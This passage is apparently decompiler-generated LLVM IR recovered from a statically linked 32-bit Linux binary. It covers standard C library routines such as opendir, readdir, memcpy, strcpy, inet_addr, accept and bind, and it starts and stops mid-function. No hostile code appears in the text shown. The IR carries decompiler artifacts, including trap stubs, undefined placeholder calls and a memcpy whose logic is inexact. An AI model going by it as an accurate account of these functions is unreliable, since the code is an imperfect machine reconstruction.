  %v2_805189f = inttoptr i32 %v1_805189f to i32*
  %v3_805189f = load i32, i32* %v2_805189f, align 4
  %v3_80518a4 = call i32 @calloc(i64 1, i32 %v3_805189f)
  %v1_80518a9 = load i32, i32* @esi, align 4
  %v2_80518a9 = add i32 %v1_80518a9, 12
  %v3_80518a9 = inttoptr i32 %v2_80518a9 to i32*
  store i32 %v3_80518a4, i32* %v3_80518a9, align 4
  %v1_80518ac = icmp eq i32 %v3_80518a4, 0
  %v1_80518b0 = icmp eq i1 %v1_80518ac, false
  br i1 %v1_80518b0, label %dec_label_pc_80518bd, label %dec_label_pc_80518b2

dec_label_pc_80518b2:                             ; preds = %dec_label_pc_805189f
  %v0_80518b2 = load i32, i32* @esi, align 4
  %v1_80518b3 = call i32 @free(i32 %v0_80518b2)
  br label %dec_label_pc_80518db

dec_label_pc_80518bd:                             ; preds = %dec_label_pc_805189f
  %v3_80518c7 = bitcast i32* %stack_var_-36 to i8*
  %v4_80518c7 = call i32 @memcpy(i8* %v3_80518c7, i32 ptrtoint (i32* @global_var_8055ef8.278 to i32), i32 24)
  %v0_80518cc = load i32, i32* @esi, align 4
  %v1_80518cc = add i32 %v0_80518cc, 24
  %v3_80518d3 = inttoptr i32 %v1_80518cc to i8*
  %v4_80518d3 = call i32 @memcpy(i8* %v3_80518d3, i32 %v15_8051861, i32 24)
  %v0_80518de.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80518db

dec_label_pc_80518db:                             ; preds = %entry, %dec_label_pc_80518b2, %dec_label_pc_80518bd
  %v0_80518de = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80518b2 ], [ %v0_80518de.pre, %dec_label_pc_80518bd ]
  %v2_80518e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80518e0, i32* @ebx, align 4
  store i32 %v0_805185d, i32* @esi, align 4
  store i32 %v0_805185c, i32* @edi, align 4
  ret i32 %v0_80518de

; uselistorder directives
  uselistorder i32 %v1_8051868, { 0, 6, 4, 5, 2, 1, 3 }
  uselistorder i32 512, { 11, 10, 1, 8, 0, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_80518db, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805189f, { 1, 0 }
}

define i32 @__GI_opendir(i8* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_80518e4 = load i32, i32* @ebx, align 4
  %v15_80518ea = ptrtoint i32* %stack_var_-92 to i32
  %v4_80518ed = ptrtoint i8* %arg1 to i32
  store i32 %v0_80518e4, i32* %edx.global-to-local, align 4
  %v4_80518f8 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 591872)
  store i32 %v4_80518ed, i32* %edx.global-to-local, align 4
  store i32 %v4_80518f8, i32* @ebx, align 4
  %tmp8 = icmp ult i32 %v4_80518f8, -4095
  br i1 %tmp8, label %dec_label_pc_8051911, label %dec_label_pc_8051905

dec_label_pc_8051905:                             ; preds = %entry
  %v1_805190a = sub i32 0, %v4_80518f8
  store i32 %v1_805190a, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8051933

dec_label_pc_8051911:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8051913 = icmp slt i32 %v4_80518f8, 0
  br i1 %v2_8051913, label %dec_label_pc_8051961, label %dec_label_pc_8051917

dec_label_pc_8051917:                             ; preds = %dec_label_pc_8051911
  %v2_805191b = call i32 @fstat(i32 %v4_80518f8, i32 %v15_80518ea)
  store i32 %v4_80518f8, i32* %edx.global-to-local, align 4
  %v2_8051921 = icmp slt i32 %v2_805191b, 0
  %v1_8051924 = icmp eq i1 %v2_8051921, false
  br i1 %v1_8051924, label %dec_label_pc_8051937, label %dec_label_pc_8051926

dec_label_pc_8051926:                             ; preds = %dec_label_pc_8051917
  %v0_8051926 = load i32, i32* @ebx, align 4
  %v1_805192f = call i32 @close(i32 %v0_8051926)
  br label %dec_label_pc_8051933

dec_label_pc_8051933:                             ; preds = %dec_label_pc_8051905, %dec_label_pc_8051926
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051961

dec_label_pc_8051937:                             ; preds = %dec_label_pc_8051917
  %v0_805193b = load i32, i32* @ebx, align 4
  store i32 %v0_805193b, i32* @eax, align 4
  %v0_805193d = call i32 @fd_to_DIR()
  store i32 %v0_805193d, i32* %edx.global-to-local, align 4
  %v1_8051944 = icmp eq i32 %v0_805193d, 0
  %v1_8051946 = icmp eq i1 %v1_8051944, false
  br i1 %v1_8051946, label %dec_label_pc_8051961, label %dec_label_pc_8051948

dec_label_pc_8051948:                             ; preds = %dec_label_pc_8051937
  %v0_8051948 = load i32, i32* @ebx, align 4
  %v1_8051951 = call i32 @close(i32 %v0_8051948)
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_8051961.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051961

dec_label_pc_8051961:                             ; preds = %dec_label_pc_8051937, %dec_label_pc_8051911, %dec_label_pc_8051933, %dec_label_pc_8051948
  %v0_8051961 = phi i32 [ %v0_805193d, %dec_label_pc_8051937 ], [ 0, %dec_label_pc_8051911 ], [ 0, %dec_label_pc_8051933 ], [ %v0_8051961.pre, %dec_label_pc_8051948 ]
  store i32 %v0_80518e4, i32* @ebx, align 4
  ret i32 %v0_8051961

; uselistorder directives
  uselistorder i32 %v4_80518f8, { 0, 2, 4, 3, 1, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051961, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051933, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-92 = alloca i32, align 4
  %v15_8051969 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051974 = call i32 @fstat(i32 %arg1, i32 %v15_8051969)
  %v1_805197a = icmp eq i32 %v2_8051974, 0
  %v1_805197d = icmp eq i1 %v1_805197a, false
  br i1 %v1_805197d, label %dec_label_pc_80519cd, label %dec_label_pc_805197f

dec_label_pc_805197f:                             ; preds = %entry
  %v1_8051983 = and i32 %tmp1, 61440
  %v6_8051988 = icmp eq i32 %v1_8051983, 16384
  br i1 %v6_8051988, label %dec_label_pc_805199d, label %dec_label_pc_805198f

dec_label_pc_805198f:                             ; preds = %dec_label_pc_805197f
  store i32 20, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80519cd

dec_label_pc_805199d:                             ; preds = %dec_label_pc_805197f
  %v0_805199f = load i32, i32* @ebx, align 4
  %v2_80519a0 = load i32, i32* %stack_var_-92, align 4
  %v3_80519a0 = call i32 @__libc_fcntl(i32 %v0_805199f, i32 3, i32 %v2_80519a0)
  %v10_80519a6 = icmp eq i32 %v3_80519a0, -1
  br i1 %v10_80519a6, label %dec_label_pc_80519cd, label %dec_label_pc_80519ac

dec_label_pc_80519ac:                             ; preds = %dec_label_pc_805199d
  %v1_80519ac = urem i32 %v3_80519a0, 4
  %v8_80519af = icmp eq i32 %v1_80519ac, 1
  %v1_80519b0 = icmp eq i1 %v8_80519af, false
  br i1 %v1_80519b0, label %dec_label_pc_80519c0, label %dec_label_pc_80519b2

dec_label_pc_80519b2:                             ; preds = %dec_label_pc_80519ac
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80519cd

dec_label_pc_80519c0:                             ; preds = %dec_label_pc_80519ac
  %v0_80519c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80519c4, i32* @eax, align 4
  %v0_80519c6 = call i32 @fd_to_DIR()
  br label %dec_label_pc_80519cf

dec_label_pc_80519cd:                             ; preds = %dec_label_pc_805199d, %entry, %dec_label_pc_80519b2, %dec_label_pc_805198f
  br label %dec_label_pc_80519cf

dec_label_pc_80519cf:                             ; preds = %dec_label_pc_80519c0, %dec_label_pc_80519cd
  %storemerge = phi i32 [ %v0_80519c6, %dec_label_pc_80519c0 ], [ 0, %dec_label_pc_80519cd ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 ()* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32, i32)* @fstat, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80519cf, { 1, 0 }
  uselistorder label %dec_label_pc_80519cd, { 2, 0, 3, 1 }
}

define i32 @__GI_readdir() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80519d4 = load i32, i32* @esi, align 4
  %v0_80519d5 = load i32, i32* @ebx, align 4
  store i32 %v0_80519d5, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_80519dd = add i32 %tmp, 24
  store i32 %v1_80519dd, i32* @ebx, align 4
  %v4_80519eb = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134559876, i32 %v1_80519dd)
  %v0_80519f0 = load i32, i32* @ebx, align 4
  %v1_80519f1 = call i32 @__pthread_return_0(i32 %v0_80519f0)
  br label %dec_label_pc_80519f9

dec_label_pc_80519f9:                             ; preds = %dec_label_pc_8051a23, %entry
  %v0_80519f9 = load i32, i32* @esi, align 4
  %v1_80519f9 = add i32 %v0_80519f9, 8
  %v2_80519f9 = inttoptr i32 %v1_80519f9 to i32*
  %v3_80519f9 = load i32, i32* %v2_80519f9, align 4
  %v2_80519fc = add i32 %v0_80519f9, 4
  %v3_80519fc = inttoptr i32 %v2_80519fc to i32*
  %v4_80519fc = load i32, i32* %v3_80519fc, align 4
  %v6_80519ff = icmp ugt i32 %v3_80519f9, %v4_80519fc
  br i1 %v6_80519ff, label %dec_label_pc_8051a23, label %dec_label_pc_8051a01

dec_label_pc_8051a01:                             ; preds = %dec_label_pc_80519f9
  %v1_8051a01 = add i32 %v0_80519f9, 20
  %v2_8051a01 = inttoptr i32 %v1_8051a01 to i32*
  %v3_8051a01 = load i32, i32* %v2_8051a01, align 4
  %v1_8051a04 = add i32 %v0_80519f9, 12
  %v2_8051a04 = inttoptr i32 %v1_8051a04 to i32*
  %v3_8051a04 = load i32, i32* %v2_8051a04, align 4
  %v1_8051a07 = inttoptr i32 %v0_80519f9 to i32*
  %v2_8051a07 = load i32, i32* %v1_8051a07, align 4
  %v3_8051a09 = inttoptr i32 %v3_8051a04 to %linux_dirent*
  %v4_8051a09 = call i32 @__getdents(i32 %v2_8051a07, %linux_dirent* %v3_8051a09, i32 %v3_8051a01)
  %tmp10 = icmp slt i32 %v4_8051a09, 1
  %tmp11 = icmp eq i1 %tmp10, false
  br i1 %tmp11, label %dec_label_pc_8051a19, label %dec_label_pc_8051a15

dec_label_pc_8051a15:                             ; preds = %dec_label_pc_8051a01
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051a3f

dec_label_pc_8051a19:                             ; preds = %dec_label_pc_8051a01
  %v1_8051a19 = load i32, i32* @esi, align 4
  %v2_8051a19 = add i32 %v1_8051a19, 8
  %v3_8051a19 = inttoptr i32 %v2_8051a19 to i32*
  store i32 %v4_8051a09, i32* %v3_8051a19, align 4
  %v0_8051a1c = load i32, i32* @esi, align 4
  %v1_8051a1c = add i32 %v0_8051a1c, 4
  %v2_8051a1c = inttoptr i32 %v1_8051a1c to i32*
  store i32 0, i32* %v2_8051a1c, align 4
  %v0_8051a23.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051a23

dec_label_pc_8051a23:                             ; preds = %dec_label_pc_80519f9, %dec_label_pc_8051a19
  %v1_8051a34 = phi i32 [ %v0_80519f9, %dec_label_pc_80519f9 ], [ %v0_8051a23.pre, %dec_label_pc_8051a19 ]
  %v1_8051a23 = add i32 %v1_8051a34, 4
  %v2_8051a23 = inttoptr i32 %v1_8051a23 to i32*
  %v3_8051a23 = load i32, i32* %v2_8051a23, align 4
  %v2_8051a28 = add i32 %v1_8051a34, 12
  %v3_8051a28 = inttoptr i32 %v2_8051a28 to i32*
  %v4_8051a28 = load i32, i32* %v3_8051a28, align 4
  %v5_8051a28 = add i32 %v4_8051a28, %v3_8051a23
  store i32 %v5_8051a28, i32* @ebx, align 4
  %v1_8051a2b = add i32 %v5_8051a28, 8
  %v2_8051a2b = inttoptr i32 %v1_8051a2b to i16*
  %v3_8051a2b = load i16, i16* %v2_8051a2b, align 2
  %v4_8051a2b = zext i16 %v3_8051a2b to i32
  %v2_8051a2f = add i32 %v4_8051a2b, %v3_8051a23
  store i32 %v2_8051a2f, i32* %edx.global-to-local, align 4
  %v1_8051a31 = add i32 %v5_8051a28, 4
  %v2_8051a31 = inttoptr i32 %v1_8051a31 to i32*
  %v3_8051a31 = load i32, i32* %v2_8051a31, align 4
  %v2_8051a34 = add i32 %v1_8051a34, 16
  %v3_8051a34 = inttoptr i32 %v2_8051a34 to i32*
  store i32 %v3_8051a31, i32* %v3_8051a34, align 4
  %v0_8051a37 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a37 = load i32, i32* @esi, align 4
  %v2_8051a37 = add i32 %v1_8051a37, 4
  %v3_8051a37 = inttoptr i32 %v2_8051a37 to i32*
  store i32 %v0_8051a37, i32* %v3_8051a37, align 4
  %v0_8051a3a = load i32, i32* @ebx, align 4
  %v1_8051a3a = inttoptr i32 %v0_8051a3a to i32*
  %v2_8051a3a = load i32, i32* %v1_8051a3a, align 4
  %v3_8051a3a = icmp eq i32 %v2_8051a3a, 0
  br i1 %v3_8051a3a, label %dec_label_pc_80519f9, label %dec_label_pc_8051a3f

dec_label_pc_8051a3f:                             ; preds = %dec_label_pc_8051a23, %dec_label_pc_8051a15
  %v3_8051a46 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8051a4b = load i32, i32* @ebx, align 4
  %v2_8051a50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051a50, i32* @ebx, align 4
  store i32 %v0_80519d4, i32* @esi, align 4
  ret i32 %v0_8051a4b

; uselistorder directives
  uselistorder i32 %v1_8051a34, { 0, 2, 1 }
  uselistorder i32 %v4_8051a09, { 1, 0 }
  uselistorder i32 %v0_80519f9, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8051a23, { 1, 0 }
}

define i32 @__GI___errno_location(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v12_8051a64 = ptrtoint i32* %stack_var_-16 to i32
  %v1_8051a6a = call i32 @times(i32 %v12_8051a64)
  %v3_8051a6f = load i32, i32* %stack_var_-16, align 4
  %v5_8051a73 = trunc i64 %tmp to i32
  %v6_8051a73 = add i32 %v3_8051a6f, %v5_8051a73
  %v3_8051a7a = mul i32 %v6_8051a73, 10000
  %v1_8051a80 = and i32 %v3_8051a7a, 2147483632
  ret i32 %v1_8051a80
}

define i32 @memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v4_8051a97 = ptrtoint i8* %arg1 to i32
  %v2_8051a9b = udiv i32 %arg3, 4
  %v7_8051a9e = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %v2_8051a9b)
  %v1_8051aa2 = urem i32 %arg3, 4
  %v2_8051aa2 = icmp eq i32 %v1_8051aa2, 0
  br i1 %v2_8051aa2, label %bb, label %dec_label_pc_8051aa7

dec_label_pc_8051aa7:                             ; preds = %entry
  %v7_8051aa7 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %v1_8051aa2)
  br label %bb

bb:                                               ; preds = %entry, %dec_label_pc_8051aa7
  ret i32 %v4_8051a97

; uselistorder directives
  uselistorder i32 %v1_8051aa2, { 1, 0 }
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ab5 = load i32, i32* @esi, align 4
  store i32 %v0_8051ab5, i32* %stack_var_-8, align 4
  %v4_8051ab6 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* @ecx, align 4
  %v13_8051ac4 = icmp eq i32 %v4_8051ab6, %arg2
  br i1 %v13_8051ac4, label %dec_label_pc_8051ad6, label %dec_label_pc_8051ac8

dec_label_pc_8051ac8:                             ; preds = %entry
  %v8_8051ac4 = icmp ult i32 %v4_8051ab6, %arg2
  br i1 %v8_8051ac4, label %dec_label_pc_8051ad3, label %dec_label_pc_8051aca

dec_label_pc_8051aca:                             ; preds = %dec_label_pc_8051ac8
  %v2_8051aca = add i32 %arg2, -1
  %v3_8051aca = add i32 %v2_8051aca, %arg3
  %v3_8051ace = add i32 %v4_8051ab6, -1
  %v4_8051ace = add i32 %v3_8051ace, %arg3
  br label %dec_label_pc_8051ad3

dec_label_pc_8051ad3:                             ; preds = %dec_label_pc_8051ac8, %dec_label_pc_8051aca
  %v1_8051ad3 = phi i32 [ %arg2, %dec_label_pc_8051ac8 ], [ %v3_8051aca, %dec_label_pc_8051aca ]
  %v0_8051ad3 = phi i32 [ %v4_8051ab6, %dec_label_pc_8051ac8 ], [ %v4_8051ace, %dec_label_pc_8051aca ]
  %v3_8051ad3 = inttoptr i32 %v1_8051ad3 to i8*
  %v4_8051ad3 = inttoptr i32 %v0_8051ad3 to i8*
  %v5_8051ad3 = call i8* @_memcpy(i8* %v4_8051ad3, i8* %v3_8051ad3, i32 %arg3)
  %v6_8051ad3 = ptrtoint i8* %v5_8051ad3 to i32
  store i32 %v6_8051ad3, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  %v2_8051ad6.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051ad6

dec_label_pc_8051ad6:                             ; preds = %entry, %dec_label_pc_8051ad3
  %v2_8051ad6 = phi i32 [ %v0_8051ab5, %entry ], [ %v2_8051ad6.pre, %dec_label_pc_8051ad3 ]
  store i32 %v2_8051ad6, i32* @esi, align 4
  ret i32 %v4_8051ab6

; uselistorder directives
  uselistorder i32 %v4_8051ab6, { 3, 1, 2, 4, 0 }
  uselistorder i32 %arg3, { 1, 2, 0, 3 }
  uselistorder i32 %arg2, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8051ad6, { 1, 0 }
  uselistorder label %dec_label_pc_8051ad3, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051adc = load i32, i32* @edi, align 4
  store i32 %v0_8051adc, i32* %stack_var_-4, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8051ae0 = sdiv i32 %sext, 16777216
  store i32 %v4_8051ae0, i32* %eax.global-to-local, align 4
  %v4_8051ae8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ae8, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_8051aee = udiv i32 %arg3, 4
  %tmp = icmp ult i32 %arg3, 4
  store i32 %v2_8051aee, i32* @ecx, align 4
  br i1 %tmp, label %bb, label %dec_label_pc_8051af3

dec_label_pc_8051af3:                             ; preds = %entry
  %v1_8051af3 = urem i32 %v4_8051ae0, 256
  %v3_8051af6 = mul nuw i32 %v1_8051af3, 16843009
  store i32 %v3_8051af6, i32* %eax.global-to-local, align 4
  %v4_8051afc = call i8* @_memset(i8* %arg1, i32 %v3_8051af6, i32 %v2_8051aee)
  %v5_8051afc = ptrtoint i8* %v4_8051afc to i32
  store i32 %v5_8051afc, i32* @ecx, align 4
  %v0_8051afe.pre = load i32, i32* %edx.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %entry, %dec_label_pc_8051af3
  %v0_8051afe = phi i32 [ %arg3, %entry ], [ %v0_8051afe.pre, %dec_label_pc_8051af3 ]
  %v1_8051afe = urem i32 %v0_8051afe, 4
  %v2_8051afe = icmp eq i32 %v1_8051afe, 0
  store i32 %v1_8051afe, i32* %edx.global-to-local, align 4
  br i1 %v2_8051afe, label %dec_label_pc_8051b07, label %dec_label_pc_8051b03.preheader

dec_label_pc_8051b03.preheader:                   ; preds = %bb
  %v2_8051b03.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051b03

dec_label_pc_8051b03:                             ; preds = %dec_label_pc_8051b03.preheader, %dec_label_pc_8051b03
  %v2_8051b03 = phi i32 [ %v2_8051b03.pre, %dec_label_pc_8051b03.preheader ], [ %v7_8051b03, %dec_label_pc_8051b03 ]
  %v0_8051b03 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b03 = trunc i32 %v0_8051b03 to i8
  %v3_8051b03 = inttoptr i32 %v2_8051b03 to i8*
  store i8 %v1_8051b03, i8* %v3_8051b03, align 1
  %v4_8051b03 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051b03 = load i1, i1* @df, align 1
  %v6_8051b03 = select i1 %v5_8051b03, i32 -1, i32 1
  %v7_8051b03 = add i32 %v6_8051b03, %v4_8051b03
  store i32 %v7_8051b03, i32* %edi.global-to-local, align 4
  %v0_8051b04 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051b04 = add i32 %v0_8051b04, -1
  %v8_8051b04 = icmp eq i32 %v1_8051b04, 0
  store i32 %v1_8051b04, i32* %edx.global-to-local, align 4
  %v1_8051b05 = icmp eq i1 %v8_8051b04, false
  br i1 %v1_8051b05, label %dec_label_pc_8051b03, label %dec_label_pc_8051b07.loopexit

dec_label_pc_8051b07.loopexit:                    ; preds = %dec_label_pc_8051b03
  %v2_8051b0c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b07

dec_label_pc_8051b07:                             ; preds = %dec_label_pc_8051b07.loopexit, %bb
  %v2_8051b0c = phi i32 [ %v2_8051b0c.pre, %dec_label_pc_8051b07.loopexit ], [ %v0_8051adc, %bb ]
  store i32 %v4_8051ae8, i32* %eax.global-to-local, align 4
  %v2_8051b0b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b0b, i32* %edx.global-to-local, align 4
  store i32 %v2_8051b0c, i32* @edi, align 4
  ret i32 %v4_8051ae8

; uselistorder directives
  uselistorder i32 %v1_8051b04, { 1, 0 }
  uselistorder i32 %v7_8051b03, { 1, 0 }
  uselistorder i32 %v1_8051afe, { 1, 0 }
  uselistorder i32 %v3_8051af6, { 1, 0 }
  uselistorder i32 %v2_8051aee, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051b03, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051b19 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051b19, i32* %edi.global-to-local, align 4
  %v4_8051b1d.pre = load i32, i32* @eax, align 4
  %v8_8051b1d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051b1d

dec_label_pc_8051b1d:                             ; preds = %dec_label_pc_8051b1d.dec_label_pc_8051b1d_crit_edge, %entry
  %v2_8051b1e = phi i32 [ %v7_8051b1e, %dec_label_pc_8051b1d.dec_label_pc_8051b1d_crit_edge ], [ %v4_8051b19, %entry ]
  %v8_8051b1d = phi i1 [ %v5_8051b1e, %dec_label_pc_8051b1d.dec_label_pc_8051b1d_crit_edge ], [ %v8_8051b1d.pre, %entry ]
  %v4_8051b1d = phi i32 [ %v0_8051b1f, %dec_label_pc_8051b1d.dec_label_pc_8051b1d_crit_edge ], [ %v4_8051b1d.pre, %entry ]
  %v7_8051b1d = phi i32 [ %v0_8051b1d.pre, %dec_label_pc_8051b1d.dec_label_pc_8051b1d_crit_edge ], [ %arg2, %entry ]
  %v1_8051b1d = inttoptr i32 %v7_8051b1d to i8*
  %v2_8051b1d = load i8, i8* %v1_8051b1d, align 1
  %v3_8051b1d = zext i8 %v2_8051b1d to i32
  %v5_8051b1d = and i32 %v4_8051b1d, -256
  %v6_8051b1d = or i32 %v3_8051b1d, %v5_8051b1d
  store i32 %v6_8051b1d, i32* %eax.global-to-local, align 4
  %v9_8051b1d = select i1 %v8_8051b1d, i32 -1, i32 1
  %v10_8051b1d = add i32 %v7_8051b1d, %v9_8051b1d
  store i32 %v10_8051b1d, i32* %esi.global-to-local, align 4
  %v3_8051b1e = inttoptr i32 %v2_8051b1e to i8*
  store i8 %v2_8051b1d, i8* %v3_8051b1e, align 1
  %v4_8051b1e = load i32, i32* %edi.global-to-local, align 4
  %v5_8051b1e = load i1, i1* @df, align 1
  %v6_8051b1e = select i1 %v5_8051b1e, i32 -1, i32 1
  %v7_8051b1e = add i32 %v6_8051b1e, %v4_8051b1e
  store i32 %v7_8051b1e, i32* %edi.global-to-local, align 4
  %v0_8051b1f = load i32, i32* %eax.global-to-local, align 4
  %v3_8051b1f = trunc i32 %v0_8051b1f to i8
  %v4_8051b1f = icmp eq i8 %v3_8051b1f, 0
  %v1_8051b21 = icmp eq i1 %v4_8051b1f, false
  br i1 %v1_8051b21, label %dec_label_pc_8051b1d.dec_label_pc_8051b1d_crit_edge, label %dec_label_pc_8051b23

dec_label_pc_8051b1d.dec_label_pc_8051b1d_crit_edge: ; preds = %dec_label_pc_8051b1d
  %v0_8051b1d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051b1d

dec_label_pc_8051b23:                             ; preds = %dec_label_pc_8051b1d
  store i32 %v4_8051b19, i32* %eax.global-to-local, align 4
  ret i32 %v4_8051b19

; uselistorder directives
  uselistorder i32 %v0_8051b1f, { 1, 0 }
  uselistorder i32 %v7_8051b1e, { 1, 0 }
  uselistorder i1 %v5_8051b1e, { 1, 0 }
  uselistorder i32 %v4_8051b19, { 1, 2, 0, 3 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v15_8051b2c = ptrtoint i32* %stack_var_-4 to i32
  %v2_8051b36 = inttoptr i32 %arg1 to i8*
  %v3_8051b36 = call i32 @inet_aton(i8* %v2_8051b36, i32 %v15_8051b2c)
  %v1_8051b40 = icmp eq i32 %v3_8051b36, 0
  br i1 %v1_8051b40, label %dec_label_pc_8051b47, label %dec_label_pc_8051b44

dec_label_pc_8051b44:                             ; preds = %entry
  %v2_8051b49.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b47

dec_label_pc_8051b47:                             ; preds = %entry, %dec_label_pc_8051b44
  %v0_8051b47 = phi i32 [ %v2_8051b49.pre, %dec_label_pc_8051b44 ], [ -1, %entry ]
  ret i32 %v0_8051b47

; uselistorder directives
  uselistorder label %dec_label_pc_8051b47, { 1, 0 }
}

define i32 @__libc_accept() local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v0_8051b4d = load i32, i32* @ebx, align 4
  %v15_8051b4e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %tmp5, i32* %stack_var_-20, align 4
  %v0_8051b68 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8051b6e = icmp eq i32 %v0_8051b68, 0
  %v1_8051b72 = icmp eq i1 %v1_8051b6e, false
  br i1 %v1_8051b72, label %dec_label_pc_8051b80, label %dec_label_pc_8051b74

dec_label_pc_8051b74:                             ; preds = %entry
  %v2_8051b77 = call i32 @__socketcall(i32 5, i32 %v15_8051b4e)
  br label %dec_label_pc_8051b98

dec_label_pc_8051b80:                             ; preds = %entry
  %v4_8051b80 = call i32 @__libc_enable_asynccancel(i32 %tmp5, i32 %tmp4, i32 %tmp2, i32 %v0_8051b4d)
  store i32 %v4_8051b80, i32* @ebx, align 4
  %v2_8051b8a = call i32 @__socketcall(i32 5, i32 %v15_8051b4e)
  store i32 %v2_8051b8a, i32* @esi, align 4
  %v0_8051b91 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b91, i32* @eax, align 4
  %v1_8051b93 = call i32 @__libc_disable_asynccancel(i32 5)
  %v0_8051b98.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051b98

dec_label_pc_8051b98:                             ; preds = %dec_label_pc_8051b74, %dec_label_pc_8051b80
  %v0_8051b98 = phi i32 [ %v2_8051b77, %dec_label_pc_8051b74 ], [ %v0_8051b98.pre, %dec_label_pc_8051b80 ]
  store i32 %v0_8051b4d, i32* @ebx, align 4
  ret i32 %v0_8051b98

; uselistorder directives
  uselistorder label %dec_label_pc_8051b98, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v15_8051ba0 = ptrtoint i32* %stack_var_-12 to i32
